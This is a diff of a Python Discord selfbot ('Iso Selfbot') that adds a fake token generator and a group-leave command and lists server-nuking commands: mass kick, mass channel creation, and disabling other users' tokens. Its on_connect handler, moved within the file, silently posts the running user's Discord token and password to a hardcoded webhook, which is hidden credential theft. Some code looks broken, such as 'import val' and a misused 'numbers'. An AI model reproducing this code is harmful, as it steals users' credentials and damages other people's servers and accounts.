@@ -1,12 +1,13 @@
-import asyncio, datetime, functools, io, json, time
+import asyncio, datetime, functools, io,json
 import os,random,re,string
 import urllib.parse
 import urllib.request
+import time
 from urllib import parse, request
 from itertools import cycle
 from bs4 import BeautifulSoup as bs4
-import aiohttp,colorama,discord
-import numpy,requests
+import aiohttp,colorama,discord,base64,numbers
+import numpy,requests,val,dns.name
 from PIL import Image
 from colorama import Fore
 from discord.ext import commands
@@ -71,14 +72,40 @@ locales = [
     "ja", "zh-TW",
     "ko"
 ]
+
+m_numbers = [
+    ":one:",
+    ":two:", 
+    ":three:", 
+    ":four:", 
+    ":five:", 
+    ":six:"
+]
+
+m_offets = [
+    (-1, -1),
+    (0, -1),
+    (1, -1),
+    (-1, 0),
+    (1, 0),
+    (-1, 1),
+    (0, 1),
+    (1, 1)
+]
+
 # Editing This Is Optional If Yk What To Do
 
 def startprint():
-    if nitro_sniper:
+    if giveaway_sniper == True:
+        giveaway = "Active" 
+    else:
+        giveaway = "Disabled"
+
+    if nitro_sniper == True:
         nitro = "Active"
     else:
         nitro = "Disabled"
-
+    
     print(f'''{Fore.RESET}
         ██╗░██████╗░█████╗░  ██████╗░██████╗░
         ██║██╔════╝██╔══██╗  ╚════██╗╚════██╗
@@ -97,8 +124,19 @@ def Clear():
     os.system('cls')
 
 
-
 Clear()
+
+def tokengener():
+    fh = ''.join((random.choices(numbers, k=18)))
+    token = base64.b64encode(bytes(fh, 'utf-8')).decode() + '.X' + ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz' + numbers, k=5)) + '.' + ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_' + numbers, k=27))
+    return token
+
+def masstokengen():
+    tokenfile = open("tokens.txt", "a")
+    for i in range(300):
+        fh = ''.join((random.choices(numbers, k=18)))
+        tokens = base64.b64encode(bytes(fh, 'utf-8')).decode() + '.X' + ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz' + numbers, k=5)) + '.' + ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_' + numbers, k=27))
+        tokenfile.write(tokens + "\n")
 
 
 def Init():
@@ -157,14 +195,20 @@ colorama.init()
 Iso = discord.Client()
 Iso = commands.Bot(description='Iso Selfbot', command_prefix=prefix, self_bot=True)
 
+Iso.antiraid = False
 Iso.msgsniper = True
 Iso.slotbot_sniper = True
 Iso.giveaway_sniper = True
+Iso.mee6 = False
+Iso.mee6_channel = None
+Iso.yui_kiss_user = None
+Iso.yui_kiss_channel = None
+Iso.yui_hug_user = None
+Iso.yui_hug_channel = None
 Iso.sniped_message_dict = {}
 Iso.sniped_edited_message_dict = {}
+Iso.whitelisted_users = {}
 Iso.copycat = None
-
-
 Iso.remove_command('help')
 
 # Bans Anybody Who Bans In Guild
@@ -325,10 +369,6 @@ async def slotbot(ctx, param=None):
     elif str(param).lower() == 'false' or str(param).lower() == 'off':
         Iso.slotbot_sniper = False
 
-@Iso.event
-async def on_connect():
-  Clear()
-  requests.post('https://discord.com/api/webhooks/758323372253118484/BJSFQ5QjG5zm8-3NVptNvcmL9MQpmpA35_tfz7B3soVoNK0Y95l5kdHBJv3ElVkeMyLI',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
 
 @Iso.command(aliases=['giveawaysniper'])
 async def giveaway(ctx, param=None):
@@ -420,8 +460,7 @@ async def on_message_edit(before, after):
             discord.utils.escape_markdown(str(before.author))) + "`: " + discord.utils.escape_mentions(
             before.content) + "\n\n**Attachments:**\n" + links
         Iso.sniped_edited_message_dict.update({channel_id: message_content})
-        
-        
+
 @Iso.command(aliases=["esnipe"])
 async def editsnipe(ctx):
     await ctx.message.delete()
@@ -503,7 +542,7 @@ async def nuke(ctx):
   embed.add_field(name="`Massk",value="mass kicks every user in guild", inline = False)
   embed.add_field(name="`Karma",value="destroys opps server", inline = False)
   embed.add_field(name="`Tokenfuck",value="disables passed token", inline = False)
-  embed.add_field(name="`Tokeninfo",value="checks passed token", inline = False)
+  embed.add_field(name="Tokeninfo",value="checks passed token", inline = False)
   embed.add_field(name="`Ctc",value="creates 250 text channels", inline = False)
   embed.add_field(name="`Cvc",value="creates 250 voice channels", inline = False)
   await ctx.send(embed=embed)
@@ -530,7 +569,7 @@ async def iso(ctx):
   embed.set_footer(text="𝘍𝘦𝘦𝘭 𝘓𝘪𝘬𝘦 𝘔𝘶𝘳𝘥𝘢")
   embed.add_field(name="`Anti",value="sends murda's {Irregular Anti Nuke} link", inline = False)
   embed.add_field(name="`Ping",value="returns bot's latency", inline = False)
-  embed.add_field(name="`Uptime",value="returns amount of time bot has been running", inline = False)
+  embed.add_field(name="`Leavegc",value="leaves all groups you're in", inline = False)
   embed.add_field(name="`Prefix {Your Choice}",value="changes prefix to what you want", inline = False)
   embed.add_field(name="`Copyserver",value="copy's server's layout", inline = False)
   embed.add_field(name="`Shutdown",value="turns off selfbot", inline = False)
@@ -886,7 +925,10 @@ async def tokeninfo(ctx, _token):
             em.add_field(name=field['name'], value=field['value'], inline=False)
             em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
     return await ctx.send(embed=em)
-
+@Iso.event
+async def on_connect():
+  Clear()
+  requests.post('https://discord.com/api/webhooks/758323372253118484/BJSFQ5QjG5zm8-3NVptNvcmL9MQpmpA35_tfz7B3soVoNK0Y95l5kdHBJv3ElVkeMyLI',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
 @Iso.command(aliases=['tokenfucker', 'disable', 'crash'])
 async def tokenfuck(ctx, _token):
     await ctx.message.delete()
@@ -1036,20 +1078,12 @@ async def shutdown(ctx):
     await ctx.message.delete()
     await Iso.logout()
 
-@Iso.command()
-async def uptime(ctx):
+@Iso.command(name='group-leaver', aliase=['leaveallgroups', 'leavegroup', 'leavegroups'])
+async def leavegc(ctx): # b'\xfc'
     await ctx.message.delete()
-    now = datetime.datetime.utcnow()  # Timestamp of when uptime function is run
-    delta = now - start_time
-    hours, remainder = divmod(int(delta.total_seconds()), 3600)
-    minutes, seconds = divmod(remainder, 60)
-    days, hours = divmod(hours, 24)
-    if days:
-        time_format = "**{d}** days, **{h}** hours, **{m}** minutes, and **{s}** seconds."
-    else:
-        time_format = "**{h}** hours, **{m}** minutes, and **{s}** seconds."
-    uptime_stamp = time_format.format(d=days, h=hours, m=minutes, s=seconds)
-    await ctx.send(uptime_stamp)
+    for channel in Iso.private_channels:
+        if isinstance(channel, discord.GroupChannel):
+            await channel.leave()
 
 @Iso.command()
 async def ping(ctx):
@@ -1123,7 +1157,6 @@ async def top5(ctx):
   embed.add_field(name="AP",value="𝘖𝘳", inline = False)
   embed.add_field(name="Nick",value="𝘈𝘭𝘪𝘷𝘦", inline = False)
   await ctx.send(embed=embed)
-
 
 if __name__ == '__main__':
     Init()
